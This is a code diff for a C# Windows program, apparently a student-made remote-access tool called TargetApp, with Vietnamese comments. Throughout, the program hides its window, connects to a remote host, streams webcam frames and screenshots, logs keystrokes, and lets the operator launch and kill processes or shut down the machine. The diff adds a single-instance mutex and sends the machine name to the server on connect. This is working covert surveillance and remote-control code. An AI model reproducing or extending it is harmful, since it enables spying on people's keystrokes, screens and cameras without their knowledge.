@@ -17,8 +17,11 @@ namespace TargetApp
     public partial class Form1 : Form
     {
         // --- CẤU HÌNH ---
-        const string HOST_IP = "26.201.85.236";
+        const string HOST_IP = "127.0.0.1";
         const int HOST_PORT = 9999;
+
+        // Mutex chống chạy 2 bản cùng lúc
+        private static Mutex _mutex = null;
 
         TcpClient client;
         NetworkStream stream;
@@ -27,21 +30,25 @@ namespace TargetApp
         VideoCaptureDevice videoSource;
         bool isCamOn = false;
         bool isSendingImage = false;
+        bool firstFrameCaptured = false;
 
         // Keylog
         [DllImport("User32.dll")] public static extern short GetAsyncKeyState(int vKey);
         System.Windows.Forms.Timer keylogTimer = new System.Windows.Forms.Timer();
         StringBuilder keyLogBuffer = new StringBuilder();
 
-        // UI Debug (Giữ biến nhưng không hiện)
-        RichTextBox txtLog = new RichTextBox();
-
         public Form1()
         {
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false;
 
-            // --- CHẾ ĐỘ TÀNG HÌNH ---
+            // --- KIỂM TRA CHẠY TRÙNG ---
+            const string appName = "TargetApp_Unique_Final";
+            bool createdNew;
+            _mutex = new Mutex(true, appName, out createdNew);
+            if (!createdNew) { Environment.Exit(0); return; }
+
+            // --- TÀNG HÌNH ---
             this.ShowInTaskbar = false;
             this.Opacity = 0;
             this.FormBorderStyle = FormBorderStyle.None;
@@ -63,9 +70,6 @@ namespace TargetApp
             keylogTimer.Start();
         }
 
-        // Hàm Log trống (vì ẩn giao diện)
-        void Log(string msg) { }
-
         void SendPacket(string msg)
         {
             if (client == null || !client.Connected) return;
@@ -73,7 +77,6 @@ namespace TargetApp
             {
                 byte[] data = Encoding.UTF8.GetBytes(msg);
                 byte[] len = BitConverter.GetBytes(data.Length);
-
                 lock (_lockObj)
                 {
                     stream.Write(len, 0, 4);
@@ -94,7 +97,7 @@ namespace TargetApp
                     client.Connect(HOST_IP, HOST_PORT);
                     stream = client.GetStream();
 
-                    SendPacket("Target V8 Online (Fix Restart)");
+                    SendPacket("INFO|" + Environment.MachineName + "|Sẵn sàng");
 
                     byte[] buffer = new byte[4096];
                     while (client.Connected)
@@ -115,7 +118,6 @@ namespace TargetApp
             }
         }
 
-        // --- XỬ LÝ LỆNH ---
         void ProcessCommand(string cmd)
         {
             try
@@ -124,23 +126,14 @@ namespace TargetApp
                 string action = parts[0];
                 string param = parts.Length > 1 ? parts[1] : "";
 
-                if (action == "WEBCAM_ON")
-                {
-                    StartWebcam();
-                }
-                else if (action == "WEBCAM_OFF")
-                {
-                    StopWebcam();
-                }
+                if (action == "WEBCAM_ON") StartWebcam();
+                else if (action == "WEBCAM_OFF") StopWebcam();
                 else if (action == "SCREENSHOT")
                 {
                     string s = CaptureScreen();
                     if (!string.IsNullOrEmpty(s)) SendPacket("IMG|" + s);
                 }
-                else if (action == "LIST")
-                {
-                    SendPacket("PID:\n" + GetProcs());
-                }
+                else if (action == "LIST") SendPacket("PID:\n" + GetProcs());
                 else if (action == "KEYLOG")
                 {
                     string logs = keyLogBuffer.ToString();
@@ -149,25 +142,11 @@ namespace TargetApp
                 }
                 else if (action == "START")
                 {
-                    try
-                    {
-                        Process.Start(param);
-                        SendPacket($"OK: Đã mở '{param}'");
-                    }
-                    catch
-                    {
-                        SendPacket($"LỖI: Không mở được '{param}'");
-                    }
+                    try { Process.Start(param); SendPacket($"OK: Đã mở '{param}'"); }
+                    catch { SendPacket($"LỖI: Không mở được '{param}'"); }
                 }
-                else if (action == "STOP")
-                {
-                    StopProcess(param);
-                }
-                else if (action == "SHUTDOWN")
-                {
-                    Process.Start("shutdown", "/s /t 0");
-                }
-                // --- ĐÃ SỬA LẠI LỆNH RESTART ---
+                else if (action == "STOP") StopProcess(param);
+                else if (action == "SHUTDOWN") Process.Start("shutdown", "/s /t 0");
                 else if (action == "RESTART")
                 {
                     SendPacket("Đang khởi động lại máy...");
@@ -177,141 +156,130 @@ namespace TargetApp
             catch { }
         }
 
-        // --- HÀM TẮT APP ---
+        // --- CAMERA SAFE MODE ---
+        void StartWebcam()
+        {
+            try
+            {
+                if (isCamOn) { SendPacket("Info: Camera đang chạy rồi."); return; }
+
+                var devs = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                if (devs.Count == 0) { SendPacket("Lỗi: Không tìm thấy Webcam!"); return; }
+
+                videoSource = new VideoCaptureDevice(devs[0].MonikerString);
+
+                videoSource.NewFrame += VideoSource_NewFrame;
+                videoSource.Start();
+                isCamOn = true;
+
+                SendPacket(">>> DA BAT CAMERA (OPTIMIZED) <<<");
+            }
+            catch (Exception ex)
+            {
+                SendPacket("CRITICAL ERROR: " + ex.Message);
+                isCamOn = false;
+            }
+        }
+
+        void StopWebcam()
+        {
+            SendPacket("CAM_OFF");
+            SendPacket(">>> DA TAT CAMERA! <<<");
+            if (!isCamOn) return;
+            isCamOn = false;
+            firstFrameCaptured = false;
+
+            try
+            {
+                if (videoSource != null && videoSource.IsRunning)
+                {
+                    videoSource.SignalToStop();
+                    videoSource.WaitForStop();
+                    videoSource = null;
+                }
+            }
+            catch { }
+        }
+
+        // --- XỬ LÝ ẢNH (ĐÃ TỐI ƯU ĐỂ TRÁNH NGHẼN MẠNG) ---
+        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
+        {
+            if (!isCamOn || isSendingImage) return;
+            isSendingImage = true;
+            try
+            {
+                if (!firstFrameCaptured)
+                {
+                    SendPacket("DEBUG: Da chup duoc anh dau tien!");
+                    firstFrameCaptured = true;
+                }
+
+                using (Bitmap original = (Bitmap)eventArgs.Frame.Clone())
+                {
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        EncoderParameters eps = new EncoderParameters(1);
+                        // Giảm chất lượng xuống 40 để nhẹ mạng
+                        eps.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 40L);
+                        original.Save(ms, GetEncoder(ImageFormat.Jpeg), eps);
+                        string base64 = Convert.ToBase64String(ms.ToArray());
+                        SendPacket("IMG|" + base64);
+                    }
+                }
+                // Nghỉ 100ms để Server kịp xử lý
+                Thread.Sleep(100);
+            }
+            catch { }
+            finally { isSendingImage = false; }
+        }
+
+        // --- HÀM LẤY ENCODER (CHỈ CÓ 1 CÁI DUY NHẤT) ---
+        private ImageCodecInfo GetEncoder(ImageFormat format)
+        {
+            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
+            foreach (ImageCodecInfo codec in codecs)
+            {
+                if (codec.FormatID == format.Guid)
+                {
+                    return codec;
+                }
+            }
+            return null;
+        }
+
+        // --- TIỆN ÍCH ---
         void StopProcess(string param)
         {
             try
             {
                 string targetName = param.ToLower().Trim().Replace(".exe", "");
                 int count = 0;
-
-                if (int.TryParse(targetName, out int pid))
-                {
-                    try { Process.GetProcessById(pid).Kill(); count++; } catch { }
-                }
+                if (int.TryParse(targetName, out int pid)) { try { Process.GetProcessById(pid).Kill(); count++; } catch { } }
                 else
                 {
-                    Process[] procs = Process.GetProcessesByName(targetName);
-                    if (procs.Length == 0)
-                    {
-                        foreach (var p in Process.GetProcesses())
-                        {
-                            if (p.ProcessName.ToLower().Contains(targetName))
-                            {
-                                try { p.Kill(); count++; } catch { }
-                            }
-                        }
-                    }
-                    else
-                    {
-                        foreach (var p in procs) { try { p.Kill(); count++; } catch { } }
-                    }
+                    foreach (var p in Process.GetProcesses())
+                        if (p.ProcessName.ToLower().Contains(targetName)) { try { p.Kill(); count++; } catch { } }
                 }
-
-                if (count > 0) SendPacket($"OK: Đã diệt {count} tiến trình '{targetName}'");
-                else SendPacket($"LỖI: Không tắt được '{targetName}' (Cần quyền Admin?)");
-            }
-            catch (Exception ex) { SendPacket($"LỖI HỆ THỐNG: {ex.Message}"); }
-        }
-
-        // --- CAMERA ---
-        void StartWebcam()
-        {
-            try
-            {
-                if (isCamOn) return;
-                var devs = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-                if (devs.Count == 0) { SendPacket("Lỗi: Không có Webcam"); return; }
-
-                videoSource = new VideoCaptureDevice(devs[0].MonikerString);
-
-                // Lấy độ phân giải tốt nhất
-                VideoCapabilities bestRes = null;
-                foreach (VideoCapabilities cap in videoSource.VideoCapabilities)
-                {
-                    if (cap.FrameSize.Width == 640 && cap.FrameSize.Height == 480) { bestRes = cap; break; }
-                }
-                if (bestRes == null && videoSource.VideoCapabilities.Length > 0)
-                    bestRes = videoSource.VideoCapabilities[videoSource.VideoCapabilities.Length - 1];
-
-                if (bestRes != null) videoSource.VideoResolution = bestRes;
-
-                videoSource.NewFrame += VideoSource_NewFrame;
-                videoSource.Start();
-                isCamOn = true;
+                SendPacket($"Đã diệt {count} tiến trình '{targetName}'");
             }
             catch { }
         }
 
-        void StopWebcam()
-        {
-            isCamOn = false;
-            if (videoSource != null)
-            {
-                if (videoSource.IsRunning) { videoSource.SignalToStop(); videoSource.WaitForStop(); }
-                videoSource = null;
-            }
-        }
-
-        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
-        {
-            if (!isCamOn || isSendingImage) return;
-            isSendingImage = true;
-
-            try
-            {
-                using (Bitmap original = (Bitmap)eventArgs.Frame.Clone())
-                {
-                    int w = original.Width > 800 ? 800 : original.Width;
-                    int h = original.Height > 600 ? 600 : original.Height;
-
-                    using (Bitmap resized = new Bitmap(original, new Size(w, h)))
-                    {
-                        using (MemoryStream ms = new MemoryStream())
-                        {
-                            EncoderParameters eps = new EncoderParameters(1);
-                            eps.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 70L);
-                            resized.Save(ms, GetEncoder(ImageFormat.Jpeg), eps);
-                            string base64 = Convert.ToBase64String(ms.ToArray());
-                            SendPacket("IMG|" + base64);
-                        }
-                    }
-                }
-            }
-            catch { }
-            finally { isSendingImage = false; }
-        }
-
-        // --- KEYLOG ---
         private bool[] _prevKeys = new bool[256];
         private void KeylogTimer_Tick(object sender, EventArgs e)
         {
             for (int i = 0; i < 255; i++)
             {
                 short state = GetAsyncKeyState(i);
-                bool isPressed = (state & 0x8000) != 0;
-                if (isPressed && !_prevKeys[i])
+                if (((state & 0x8000) != 0) && !_prevKeys[i])
                 {
                     Keys key = (Keys)i;
-                    string text = key.ToString();
-                    if (key >= Keys.A && key <= Keys.Z) text = text;
-                    else if (key >= Keys.D0 && key <= Keys.D9) text = key.ToString().Replace("D", "");
-                    else if (key == Keys.Space) text = " ";
-                    else if (key == Keys.Enter) text = "\n[ENTER]";
-                    else if (key == Keys.Back) text = "[BS]";
-                    else text = $"[{key}]";
-                    keyLogBuffer.Append(text);
+                    keyLogBuffer.Append($"[{key}]");
                 }
-                _prevKeys[i] = isPressed;
+                _prevKeys[i] = (state & 0x8000) != 0;
             }
         }
-
-        string GetProcs()
-        {
-            StringBuilder sb = new StringBuilder();
-            foreach (Process p in Process.GetProcesses()) sb.AppendLine($"[{p.Id}] {p.ProcessName}");
-            return sb.ToString();
-        }
+        string GetProcs() { return string.Join("\n", Process.GetProcesses().Select(p => $"[{p.Id}] {p.ProcessName}")); }
         string CaptureScreen()
         {
             try
@@ -322,18 +290,12 @@ namespace TargetApp
                     using (Graphics g = Graphics.FromImage(bmp)) g.CopyFromScreen(Point.Empty, Point.Empty, b.Size);
                     using (MemoryStream ms = new MemoryStream())
                     {
-                        EncoderParameters eps = new EncoderParameters(1);
-                        eps.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 60L);
-                        bmp.Save(ms, GetEncoder(ImageFormat.Jpeg), eps);
+                        bmp.Save(ms, ImageFormat.Jpeg);
                         return Convert.ToBase64String(ms.ToArray());
                     }
                 }
             }
             catch { return ""; }
-        }
-        private ImageCodecInfo GetEncoder(ImageFormat f)
-        {
-            foreach (var c in ImageCodecInfo.GetImageDecoders()) if (c.FormatID == f.Guid) return c; return null;
         }
         private void Form1_FormClosing(object sender, FormClosingEventArgs e) { StopWebcam(); }
     }
